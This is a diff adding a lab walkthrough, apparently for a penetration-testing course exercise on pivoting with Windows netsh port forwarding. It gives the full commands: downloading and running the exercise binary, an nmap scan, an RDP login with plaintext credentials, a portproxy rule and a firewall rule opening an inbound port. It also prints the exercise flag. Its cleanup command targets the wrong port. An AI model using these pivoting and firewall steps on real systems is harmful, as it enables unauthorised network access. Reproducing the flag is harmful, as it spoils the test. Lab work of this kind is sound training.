@@ -1,0 +1,52 @@
+Questions 2
+Capstone Exercise: Start VM Group 2. Download the netsh_exercise_client.bin binary from http://MULTISERVER03/umbraco/netsh_exercise_client.bin to your Kali machine. Create a port forward on MULTISERVER03 that allows you to run this binary against port 4545 on PGDATABASE01. The flag will be returned when a successful connection is made.
+Note: the source files used to build the netsh_exercise_client.bin binary can be downloaded from /umbraco/client_source.zip.
+
+HINT
+Repeat the steps in this learning unit.
+Use the command in Listing 60, and change the port to 4545 and the IP.
+Download the netsh_exercise_client.bin.
+Make the binary executable and run it against 4545 on MULTISERVER03 to get the flag.
+
+# Download the exploit tools 
+wget http://192.168.180.64/umbraco/netsh_exercise_client.bin
+chmod 755 netsh_exercise_client.bin
+
+# Scan the MULTISERVER03 server
+nmap -sC -sV -Pn -T4 192.168.180.64
+...
+53/tcp open dns
+80/tcp open http
+135/tcp open msrpc
+3389/tcp open ms-wbt-server
+...
+
+# Since the 3389 is open lets try the previous credentials
+xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:192.168.180.64
+
+# Open CMD in Administrators
+netsh interface portproxy add v4tov4 listenport=4455 listenaddress=192.168.180.64 connectport=4545 connectaddress=10.4.180.215
+
+netsh interface portproxy show all
+...
+192.168.180.64  4455        10.4.180.215    4545
+...
+
+# Poke the hole in the MULTISERVER03 Windows Firewall\
+netsh advfirewall firewall add rule name="port_forward_DB_4455" protocol=TCP dir=in localip=192.168.180.64 localport=4455 action=allow
+Ok.
+
+# exploit
+./netsh_exercise_client.bin -i 192.168.180.64 -p 4455
+Connecting to 192.168.180.64:4455
+Flag: "OS{eddd5b4533d72b2c5fe62dc8adbafcec}"
+
+# Lets remove the records
+netsh advfirewall firewall delete rule name="port_forward_DB_4455"
+netsh interface portproxy del v4tov4 listenport=4545 listenaddress=192.168.180.64
+...
+# If failed below warning msg will be prompt otherwise no msg will be prompt
+The system cannot find the file specified.
+...
+
+
